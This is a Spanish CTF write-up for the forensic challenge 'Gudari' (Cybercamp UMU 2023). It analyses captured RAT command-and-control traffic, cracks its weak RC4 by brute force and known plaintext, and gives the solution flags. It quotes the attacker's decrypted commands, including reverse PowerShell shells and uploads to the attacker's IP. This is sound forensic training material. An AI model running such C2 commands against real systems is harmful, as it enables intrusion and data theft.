---
layout: post
title: "Cybercamp UMU - Gudari [Forensic]"
categories: ctf
tags: ikerl ctf forensic
date: 2023-07-09 19:00:00 +0100
author: ikerl
---
 
Gudari es uno de los retos que hemos creado para el CTF de la [Cybercamp UMU](https://cybercampmurcia.um.es/evento/capture-the-flag-ctf-cybercamp-umu/), organizado en julio de 2023 por la Universidad de Murcia en colaboración con el Club de Ciberseguridad de la Facultad de Informática, el grupo de CTFs Watch4Hack e INCIBE. Está basado en un desarrollo que hice en 2019 de un RAT llamado [GudariRAT](https://github.com/ikerl/Gudari_client). Fue un proyecto personal que consistió en el desarrollo de una herramienta de Command and Control desde cero y ha resultado muy útil para este CTF debido a que implementaba una gran cantidad de malas prácticas que se cometen habitualmente cuando se empieza en esto.

La descripción proporcionada durante el evento es la siguiente:

```¡AYUDAAAA! Me han secuestrado la flag y no tengo suficiente dinero como para pagar el rescate. Estaba capturando con Wireshark mientras sucedía todo, pero no soy capaz de entender nada.```

Para este reto, se proporciona una captura de tráfico que se debe analizar para entender qué ha ocurrido exactamente y recuperar la flag.

## Análisis de la traza

Estas son las conclusiones que se extraen tras un primer análisis de la traza con Wireshark:

1. Hay una primera conexión desde un equipo hacia el puerto 4444 de otro equipo. Esta conexión se mantiene durante toda la traza. El puerto 4444 se usa habitualmente en shells reversas de meterpreter o herramientas similares. El contenido de este tráfico no es ASCII y tampoco pertenece a ningún protocolo conocido. Mirando su entropía se puede sospechar de que se trata de tráfico cifrado.
2. Después de esta primera conexión se inicia una nueva conexión en la misma dirección que la anterior. Sin embargo, esta conexión va en plano y podemos ver que se trata de una shell reversa de PowerShell. Se puede ver una enumeración de los servicios y el listado de ficheros de la carpeta donde está la flag. Junto a la flag podemos encontrar un binario llamado `GudariRAT.exe` que hace saltar todas nuestras alarmas.
3. Tras esta conexión se observan tres conexiones más. Dos de ellas son conexiones que únicamente envían texto (una flag falsa `flag{Gudari_H4_T0m4do_Fl4gs}` y una nota de rescate). La última vuelve a ser una shell reversa de PowerShell que vuelve a listar los ficheros de la carpeta de la flag. Analizando los cambios que han ocurrido respecto a la primera vez que se listan los ficheros se observa que aparece un nuevo fichero llamado `readme.txt` y que se ha modificado el fichero `flag.txt`. También se ve el comando `notepad readme.txt` que sirve para abrir la nota de rescate con Notepad.

Con toda esta información, estas son nuestras hipótesis de lo que ha podido pasar:

1. En el equipo de la víctima se ha ejecutado el binario sospechoso.
2. El atacante ha conseguido ejecución de código en la máquina comprometida.
3. Utiliza la conexión del puerto 4444 para su actividad maliciosa.
4. Roba la flag.
5. Modifica la flag.
6. Sube la nota de rescate y la abre.

Lo único que nos falta es conocer el contenido de la conexión al puerto 4444 para averiguar exactamente qué es lo que ha realizado el atacante. Tras una rápida búsqueda por Internet, daremos con el repositorio del `GudariRAT`.

## Análisis del código fuente del GudariRAT

Una vez que conocemos la herramienta de Command and Control que se ha utilizado, toca entender cómo funciona exactamente. Vemos que cuenta con funcionalidades de reverse shell de PowerShell y de transferencia de ficheros que cuadra mucho con la actividad maliciosa que hemos identificado en la traza.

Por otro lado, vemos que soporta el uso de RC4 para cifrar los datos de la conexión principal. En este momento podemos deducir que la conexión inicial al puerto 4444 está cifrada con RC4.

También vemos que cada mensaje consta de dos bytes que indican la longitud del mensaje y que luego van directamente los datos cifrados en RC4.

## Vulnerabilidades del canal de comunicación

Para terminar de resolver el reto, tenemos que conseguir descifrar este tráfico cifrado con RC4 y de esta manera descubrir toda la interacción "cifrada" que ha tenido el atacante con la víctima. Revisando la implementación del RC4 de Gudari, identificamos las siguientes vulnerabilidades graves:

- Los mensajes se cifran individualmente y no en flujo. Es decir, un mismo mensaje que se envíe en diferentes tiempos tendrá el mismo resultado. Por ejemplo, ocurre esto en el mensaje `090058220984af2f9a743f` (EXEC type flag.txt).
- Los mensajes no contienen un vector de inicialización que haga que cada mensaje sea único.
- Las contraseñas utilizadas en Gudari parecen débiles. Por defecto, se utiliza la contraseña `abcd`.

Estas vulnerabilidades criptográficas son muy graves y se pueden explotar de las siguientes maneras:

- **Fuerza bruta al mensaje**: Podemos utilizar herramientas para hacer fuerza bruta al cifrado RC4. En este caso, se ha podido obtener la clave utilizando el diccionario `rockyou` y la herramienta [rc4_brute_force](https://github.com/tarnoldh65/rc4_brute_force).
- **XOR entre el texto cifrado y el texto en plano**: Si hacemos el XOR del tráfico cifrado inicial con algo conocido, podremos conseguir la clave XOR que se ha utilizado durante la comunicación (RC4 al final es un cifrador de flujo que realiza XOR). Luego aplicamos esta clave al resto de mensajes y obtendremos el texto en plano.

## Romper el RC4 mediante fuerza bruta

La contraseña utilizada durante el reto aparece en el diccionario `rockyou`. Podemos usar herramientas que permitan hacer fuerza bruta a RC4 para obtener la contraseña y descifrar todos los mensajes. Este es el comando empleado:

```
python3 rc4_brute_force.py -f /usr/share/wordlists/rockyou.txt -c '175a6c98d014ac596a27b8e15597c0e9248dd3a7f52397...'
```

El programa ha encontrado que la contraseña `s3cr3tary` permite obtener una salida ASCII válida. Una vez que tenemos la contraseña, ya podemos ir descifrando los mensajes uno por uno y obtener la flag `cyberflag{Gud4r1_3n_F0r3ns3}`.


## Romper el RC4 con texto plano conocido

Si conocemos el texto en plano de alguno de los mensajes que van cifrados, podremos conseguir los valores que se han utilizado para cifrar el mensaje simplemente haciendo el XOR del texto plano con el texto cifrado. En este caso, mirando el código fuente, vemos que el primer mensaje que manda la víctima al puerto 4444 es el banner. Podemos hacer el XOR del banner cifrado con el texto en plano del banner para obtener los valores que se usan para hacer el XOR y cifrar los mensajes. Como todos los mensajes se cifran individualmente y no en flujo, y no contienen un vector de inicialización, podremos utilizar estos bytes de cifrado/descifrado para todos los mensajes.

Al descifrar el mensaje que contiene la flag, obtendremos la flag del reto:

```
Banner cifrado (primer mensaje de la traza): 175a6c98d014ac596a27b8e15597c0e9248dd3a7f523971c15c276c38e.. (1)
Banner en plano (extraído desde el repo): 0a20205f5f5f5f5f5f5f5f202020202020202020202e5f5f5f2020205f.. (2)
(1) xor (2): 1d7a4cc78f4bf3063578e7c175b7e0c904adf387d50dc8434ae256e3d1.. (clave)

Mensaje de la flag cifrada: 7e032ea2fd2d9f675203a0b4118392f85b9e9dd8933dba702491659e.. (flag cifrada)
(flag cifrada) xor (clave) = cyberflag{Gud4r1_3n_F0r3ns3}
```

Al igual que con el mensaje que contiene la flag podemos descifrar mensaje a mensaje toda la conversación cifrada.

## Historia completa

Ahora que podemos descifrar todos los mensajes, podemos reconstruir toda la historia. Estos son los comandos que se ejecutan a través de la conexión del puerto 4444 que va cifrado:

1. **EXEC hostname**: Se enumera el hostname
2. **EXEC whoami**: Se enumera el usuario
3. **EXEC ipconfig**: Se enumera la configuración de red
4. **POWERSHELL 192.168.154.129 59560**: Abre una shell reversa de powershell hacia el puerto 59560 del atacante. Desde este powershell se enumeran los servicios y se lista la carpeta de la flag.
5. **EXEC pwd**: Enumera el directorio actual para verificar que está en el directorio de la flag.
6. **EXEC dir**: Lista el directorio de la flag y ve que existe la flag.
7. **EXEC type flag.txt**: Lee la flag original.
8. **UPLOAD 192.168.154.129 58835 flag.txt C:\Users\Iker\Desktop**: Se conecta al puerto 57191 del atacante, sube la flag falsa y sobrescribe la original. La flag falsa que se ve en plano es justamente esta flag cuando se sube.
9. **EXEC type flag.txt**: Verifica que la flag ha sido correctamente sobrescrita.
10. **UPLOAD 192.168.154.129 57191 readme.txt C:\Users\Iker\Desktop**: Se conecta al puerto 57191 del atacante y sube el readme al directorio de la flag.
11. **EXEC dir**: Lista el directorio de la flag de nuevo.
12. **POWERSHELL 192.168.154.129 48190**: Abre una shell reversa de powershell hacia el puerto 48190 del atacante. Desde esta shell se abre la nota de rescate con notepad.
